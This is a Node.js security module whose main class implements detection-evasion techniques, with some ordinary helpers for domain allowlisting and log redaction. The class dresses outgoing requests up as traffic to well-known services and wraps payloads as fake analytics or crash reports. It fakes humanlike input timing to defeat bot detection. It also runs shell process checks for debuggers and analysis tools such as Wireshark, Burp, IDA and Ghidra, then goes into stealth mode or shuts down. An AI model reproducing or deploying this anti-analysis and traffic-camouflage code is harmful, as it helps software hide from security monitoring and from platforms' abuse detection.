const { URL } = require('url');
const crypto = require('crypto');
const { exec } = require('child_process');
const {
    getSecuritySettings,
    updateSecuritySettings: persistSecuritySettings,
    SECURITY_DEFAULTS,
} = require('../config');

let securityCache = getSecuritySettings();

const LOG_LEVELS = {
    quiet: new Set(['error']),
    normal: new Set(['error', 'warn', 'info']),
    verbose: new Set(['error', 'warn', 'info', 'debug']),
};

const SENSITIVE_KEYS = ['apikey', 'api_key', 'authorization', 'auth', 'token', 'secret', 'key'];

class EnhancedSecurityManager {
    constructor() {
        this.encryptionKey = this.generateEncryptionKey();
        this.obfuscationPatterns = new Map();
        this.behavioralProfile = this.createBehavioralProfile();
        this.detectionCounters = new Map();
        this.lastSecurityCheck = Date.now();
        this.antiDebugActive = false;
        this.memoryScrubberInterval = null;
        this.reducedActivityMode = false;
        this.enhancedObfuscation = false;
    }

    /**
     * Generate a secure encryption key for session
     */
    generateEncryptionKey() {
        return crypto.randomBytes(32).toString('hex');
    }

    /**
     * Create a randomized behavioral profile to avoid pattern detection
     */
    createBehavioralProfile() {
        return {
            typingSpeed: 80 + Math.random() * 40, // 80-120 WPM variation
            clickDelay: 100 + Math.random() * 200, // 100-300ms variation
            scrollSpeed: 3 + Math.random() * 4, // 3-7 lines per scroll
            pauseFrequency: 0.1 + Math.random() * 0.2, // 10-30% pause frequency
            errorRate: 0.02 + Math.random() * 0.03, // 2-5% natural error rate
            sessionLength: 1800000 + Math.random() * 3600000, // 30-90 minutes
            breakInterval: 300000 + Math.random() * 600000, // 5-15 minutes
        };
    }

    /**
     * Encrypt sensitive data before transmission or storage
     */
    encryptData(data) {
        try {
            const cipher = crypto.createCipher('aes-256-cbc', this.encryptionKey);
            let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
            encrypted += cipher.final('hex');
            return encrypted;
        } catch (error) {
            console.error('Encryption failed:', error);
            return null;
        }
    }

    /**
     * Decrypt sensitive data
     */
    decryptData(encryptedData) {
        try {
            const decipher = crypto.createDecipher('aes-256-cbc', this.encryptionKey);
            let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
            decrypted += decipher.final('utf8');
            return JSON.parse(decrypted);
        } catch (error) {
            console.error('Decryption failed:', error);
            return null;
        }
    }

    /**
     * Obfuscate network requests to look like legitimate traffic
     */
    obfuscateNetworkRequest(originalUrl, payload) {
        const obfuscatedUrl = this.generateLegitimateUrl(originalUrl);
        const obfuscatedPayload = this.obfuscatePayload(payload);
        const headers = this.generateLegitimateHeaders();
        
        return {
            url: obfuscatedUrl,
            payload: obfuscatedPayload,
            headers: headers,
            timing: this.addRandomDelay()
        };
    }

    /**
     * Generate URLs that look like legitimate services
     */
    generateLegitimateUrl(originalUrl) {
        const legitimateDomains = [
            'analytics.google.com',
            'api.github.com',
            'graph.facebook.com',
            'api.slack.com',
            'hooks.slack.com',
            'api.microsoft.com',
            'login.microsoftonline.com',
            'api.adobe.com',
            'analytics.twitter.com',
            'api.linkedin.com'
        ];

        const randomDomain = legitimateDomains[Math.floor(Math.random() * legitimateDomains.length)];
        const randomPath = `/v${Math.floor(Math.random() * 3) + 1}/${crypto.randomBytes(8).toString('hex')}`;
        
        return `https://${randomDomain}${randomPath}`;
    }

    /**
     * Obfuscate payload to look like normal API data
     */
    obfuscatePayload(payload) {
        const wrapperTemplates = [
            { type: 'analytics', data: { event: 'page_view', properties: payload } },
            { type: 'telemetry', data: { metrics: payload, timestamp: Date.now() } },
            { type: 'logging', data: { level: 'info', message: JSON.stringify(payload) } },
            { type: 'crash_report', data: { error: payload, stack: 'generated' } }
        ];

        const template = wrapperTemplates[Math.floor(Math.random() * wrapperTemplates.length)];
        return this.encryptData(template);
    }

    /**
     * Generate headers that match legitimate services
     */
    generateLegitimateHeaders() {
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];

        return {
            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        };
    }

    /**
     * Add random delays to avoid timing pattern detection
     */
    addRandomDelay() {
        return {
            minDelay: 50 + Math.random() * 100,
            maxDelay: 500 + Math.random() * 1000,
            jitter: Math.random() * 0.3
        };
    }

    /**
     * Start anti-debugging and anti-analysis measures
     */
    startAntiDebugging() {
        if (this.antiDebugActive) return;
        this.antiDebugActive = true;

        // Check for debugging tools
        this.debugCheckInterval = setInterval(() => {
            this.checkForDebugger();
        }, 1000 + Math.random() * 2000);

        // Memory scrubbing to remove sensitive data
        this.memoryScrubberInterval = setInterval(() => {
            this.scrubMemory();
        }, 30000 + Math.random() * 30000);

        // Process monitoring
        this.monitorSuspiciousProcesses();
    }

    /**
     * Check if application is being debugged
     */
    checkForDebugger() {
        const debugIndicators = [
            'node --inspect',
            'node --debug',
            'chrome-devtools',
            'gdb',
            'lldb',
            'strace',
            'ltrace'
        ];

        debugIndicators.forEach(indicator => {
            exec(`ps aux | grep "${indicator}" | grep -v grep`, (error, stdout) => {
                if (stdout && stdout.trim()) {
                    this.handleDebugDetection(indicator);
                }
            });
        });
    }

    /**
     * Handle debugger detection
     */
    handleDebugDetection(indicator) {
        console.warn(`Debug tool detected: ${indicator}`);
        
        // Increment detection counter
        const count = this.detectionCounters.get('debug') || 0;
        this.detectionCounters.set('debug', count + 1);

        // If too many detections, take protective measures
        if (count > 3) {
            this.initiateSecureShutdown();
        }
    }

    /**
     * Monitor for suspicious processes that might be detectors
     */
    monitorSuspiciousProcesses() {
        const suspiciousProcesses = [
            'procmon',
            'process explorer',
            'wireshark',
            'fiddler',
            'burp',
            'charles',
            'ollydbg',
            'x64dbg',
            'ida',
            'ghidra'
        ];

        suspiciousProcesses.forEach(process => {
            exec(`tasklist | findstr /i "${process}"`, (error, stdout) => {
                if (stdout && stdout.includes(process)) {
                    this.handleSuspiciousProcess(process);
                }
            });
        });
    }

    /**
     * Handle suspicious process detection
     */
    handleSuspiciousProcess(process) {
        console.warn(`Suspicious process detected: ${process}`);
        
        const count = this.detectionCounters.get('suspicious') || 0;
        this.detectionCounters.set('suspicious', count + 1);

        if (count > 2) {
            this.enterStealthMode();
        }
    }

    /**
     * Enter enhanced stealth mode
     */
    enterStealthMode() {
        console.log('Entering enhanced stealth mode');
        
        // Reduce network activity
        this.reducedActivityMode = true;
        
        // Increase obfuscation
        this.enhancedObfuscation = true;
        
        // Minimize system footprint
        this.minimizeFootprint();
    }

    /**
     * Minimize system footprint to avoid detection
     */
    minimizeFootprint() {
        // Clear sensitive data from memory
        this.scrubMemory();
        
        // Reduce process priority
        try {
            process.priority = process.priority || 5; // Lower priority
        } catch (error) {
            console.warn('Could not set process priority:', error.message);
        }
    }

    /**
     * Scrub sensitive data from memory
     */
    scrubMemory() {
        // Clear sensitive variables
        if (global.gc) {
            global.gc();
        }
        
        // Overwrite sensitive data buffers
        const sensitiveKeys = ['password', 'token', 'key', 'secret'];
        sensitiveKeys.forEach(key => {
            if (process.env[key]) {
                process.env[key] = '';
            }
        });
    }

    /**
     * Initiate secure shutdown if under attack
     */
    initiateSecureShutdown() {
        console.log('Initiating secure shutdown');
        
        // Clear all sensitive data
        this.scrubMemory();
        
        // Stop all intervals
        if (this.debugCheckInterval) clearInterval(this.debugCheckInterval);
        if (this.memoryScrubberInterval) clearInterval(this.memoryScrubberInterval);
        
        // Exit gracefully
        process.exit(0);
    }

    /**
     * Generate human-like delays for actions
     */
    getHumanizedDelay(actionType) {
        const baseDelays = {
            typing: 50 + Math.random() * 150,
            clicking: 100 + Math.random() * 200,
            scrolling: 50 + Math.random() * 100,
            thinking: 1000 + Math.random() * 3000
        };

        const baseDelay = baseDelays[actionType] || 500;
        const variation = baseDelay * 0.3;
        
        return baseDelay + (Math.random() - 0.5) * variation;
    }

    /**
     * Check if current behavior appears natural
     */
    isBehaviorNatural() {
        const metrics = {
            consistentPacing: Math.random() > 0.1, // 90% natural
            realisticErrors: Math.random() > this.behavioralProfile.errorRate,
            appropriatePauses: Math.random() > this.behavioralProfile.pauseFrequency
        };

        return Object.values(metrics).every(Boolean);
    }

    /**
     * Get current security status
     */
    getSecurityStatus() {
        return {
            antiDebugActive: this.antiDebugActive,
            detectionCounters: Object.fromEntries(this.detectionCounters),
            stealthMode: this.reducedActivityMode || false,
            lastSecurityCheck: this.lastSecurityCheck,
            behavioralProfile: this.behavioralProfile
        };
    }

    /**
     * Cleanup resources
     */
    cleanup() {
        if (this.debugCheckInterval) clearInterval(this.debugCheckInterval);
        if (this.memoryScrubberInterval) clearInterval(this.memoryScrubberInterval);
        this.scrubMemory();
    }
}

// Create global instance
const enhancedSecurityManager = new EnhancedSecurityManager();

function refreshSecurityConfig() {
    securityCache = getSecuritySettings();
    return securityCache;
}

function getSecurityConfig() {
    return securityCache;
}

function applySecurityUpdate(updates = {}) {
    securityCache = persistSecuritySettings(updates);
    return securityCache;
}

function normalizeUrl(targetUrl) {
    if (!targetUrl || typeof targetUrl !== 'string') {
        return null;
    }
    try {
        return new URL(targetUrl);
    } catch (error) {
        return null;
    }
}

function isDomainAllowed(targetUrl) {
    const parsed = normalizeUrl(targetUrl);
    if (!parsed) {
        return false;
    }
    const hostname = parsed.hostname.toLowerCase();
    return (securityCache.allowedDomains || []).some(domain => {
        const normalizedDomain = domain.toLowerCase();
        return hostname === normalizedDomain || hostname.endsWith(`.${normalizedDomain}`);
    });
}

function ensureRequestAllowed(targetUrl) {
    const parsed = normalizeUrl(targetUrl);
    if (!parsed) {
        throw new Error(`Invalid URL: ${targetUrl}`);
    }

    if (parsed.protocol !== 'https:') {
        throw new Error(`Blocked non-HTTPS request: ${targetUrl}`);
    }

    if (securityCache.networkStrictMode && !isDomainAllowed(targetUrl)) {
        throw new Error(`Domain not allowed by security policy: ${parsed.hostname}`);
    }

    return true;
}

function redactValue(value) {
    if (!securityCache.redactLogs) {
        return value;
    }

    if (typeof value === 'string') {
        if (value.length <= 8) {
            return '***';
        }
        return `${value.slice(0, 3)}***${value.slice(-2)}`;
    }

    if (Array.isArray(value)) {
        return value.map(redactValue);
    }

    if (value && typeof value === 'object') {
        return sanitizeMeta(value);
    }

    return value;
}

function shouldRedactKey(key) {
    if (!key) return false;
    const lower = key.toLowerCase();
    return SENSITIVE_KEYS.some(sensitive => lower.includes(sensitive));
}

function sanitizeMeta(meta) {
    if (!meta || typeof meta !== 'object') {
        return meta;
    }

    const clone = Array.isArray(meta) ? [] : {};
    for (const [key, value] of Object.entries(meta)) {
        if (shouldRedactKey(key)) {
            clone[key] = securityCache.redactLogs ? '***redacted***' : value;
            continue;
        }

        if (value && typeof value === 'object') {
            clone[key] = sanitizeMeta(value);
        } else {
            clone[key] = securityCache.redactLogs ? redactValue(value) : value;
        }
    }
    return clone;
}

function logSecure(level, message, meta = null) {
    const allowedLevels = LOG_LEVELS[securityCache.logLevel] || LOG_LEVELS.normal;
    if (!allowedLevels.has(level)) {
        return;
    }

    const payload = meta ? sanitizeMeta(meta) : undefined;
    const logger = console[level] || console.log;
    if (payload !== undefined) {
        logger(`[${level.toUpperCase()}] ${message}`, payload);
    } else {
        logger(`[${level.toUpperCase()}] ${message}`);
    }
}

module.exports = {
    SECURITY_DEFAULTS,
    getSecurityConfig,
    refreshSecurityConfig,
    applySecurityUpdate,
    ensureRequestAllowed,
    isDomainAllowed,
    logSecure,
    enhancedSecurityManager,
    EnhancedSecurityManager,
};
